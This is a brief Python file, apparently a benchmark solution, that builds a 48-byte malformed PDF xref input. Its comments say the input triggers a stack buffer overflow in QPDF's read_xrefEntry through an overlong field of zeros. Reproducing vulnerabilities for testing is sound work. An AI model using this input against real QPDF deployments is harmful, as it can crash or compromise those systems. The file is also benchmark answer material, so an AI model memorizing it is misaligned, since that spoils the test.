import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a stack buffer overflow in QPDF::read_xrefEntry
        # triggered by an overlong f1 or f2 entry in a PDF xref table.
        # The ground-truth PoC length is 48 bytes.

        # To reach the vulnerable function, the input must start with a
        # valid xref table header.
        # "xref\n"      (5 bytes)
        # "0 1\n"       (4 bytes)
        # Total header: 9 bytes.

        # The rest of the PoC will be the malicious entry line.
        # Total length = 48 bytes, so the line must be 48 - 9 = 39 bytes.
        
        # The xref entry format is: <f1> <f2> <keyword>\n
        # The vulnerability description points to an overlong f1 or f2 field
        # consisting of zeros. We'll make the f2 field overlong.
        #
        # Line structure: "0" (f1) + " " + "0"*N (f2) + " " + "f" (keyword) + "\n"
        # Line length = 1 + 1 + N + 1 + 1 + 1 = N + 5
        # We need the line length to be 39 bytes.
        # 39 = N + 5  =>  N = 34

        num_zeros_for_f2 = 34
        
        poc = b"xref\n"
        poc += b"0 1\n"
        poc += b"0 " + (b"0" * num_zeros_for_f2) + b" f\n"
        
        return poc